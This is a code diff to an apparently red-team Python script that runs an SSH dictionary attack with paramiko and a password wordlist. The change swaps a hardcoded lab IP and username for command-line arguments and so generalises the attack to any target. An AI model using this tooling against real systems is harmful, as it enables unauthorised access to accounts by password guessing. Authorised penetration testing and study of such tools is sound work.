@@ -3,6 +3,7 @@ import itertools
 import paramiko
 from tqdm import tqdm
 import time
+import argparse
 
 
 def bruteforce_dict_ssh(ip_addr, username):
@@ -10,7 +11,7 @@ def bruteforce_dict_ssh(ip_addr, username):
     max_length = 1
     password = ''
     
-    with open('red_team_scripts\InsidePro.dic', 'r') as f:
+    with open('InsidePro.dic', 'r') as f:
         content=f.read()
         
     
@@ -61,8 +62,14 @@ def ssh_connect(ip_addr, username, password):
         client.close()
         
 if __name__ == "__main__":
-    ip_addr = '172.16.233.149'
-    user_name = 'c2srnano13'
+    parser = argparse.ArgumentParser(description='Dictionary attack')
+    parser.add_argument('target_ip_addr', help='IP of target')
+    parser.add_argument('target_user_name', help='Username of target')
+    
+    args = parser.parse_args()
+    ip_addr = args.target_ip_addr
+    user_name = args.target_user_name
+    print(f"[*] Starting Dictionary attack on {ip_addr} with username {user_name}")
     success,password=bruteforce_dict_ssh(ip_addr,user_name)
     if success:
         print(f"Password found: {password}")
